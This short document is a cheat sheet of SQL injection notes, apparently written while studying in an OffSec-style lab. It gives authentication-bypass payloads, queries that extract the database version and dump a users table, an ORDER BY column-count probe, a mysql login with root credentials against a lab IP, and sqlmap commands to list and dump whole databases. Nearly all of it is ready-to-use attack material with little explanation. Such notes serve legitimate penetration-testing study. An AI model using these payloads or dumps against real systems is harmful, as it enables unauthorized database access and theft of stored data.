To check sql vulnerability is there or not

```
offsec' OR 1=1 -- //
```

mysql code

```
mysql -u root -p'root' -h 192.168.50.16 -P 3306
```

sqlmap tool code

```
sqlmap -u {ip} -p id --dump-all
	sqlmap -u {ip} --dbs
	sqlmap -u {ip} -D {name_of_database} --tables
	sqlmap -u {ip} -D {name_of_database} -T {name} --columns
	sqlmap -u {ip} -D {name_of_database} -T {name} -C --dump
	sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
```

For verson

```
' or 1=1 in (select @@version) -- //
```

To dump all data from user table

```
' OR 1=1 in (SELECT * FROM users) -- //
```

To discover the correct number of columns, we can submit the following injected query into the search bar

```
' ORDER BY 1-- //
```

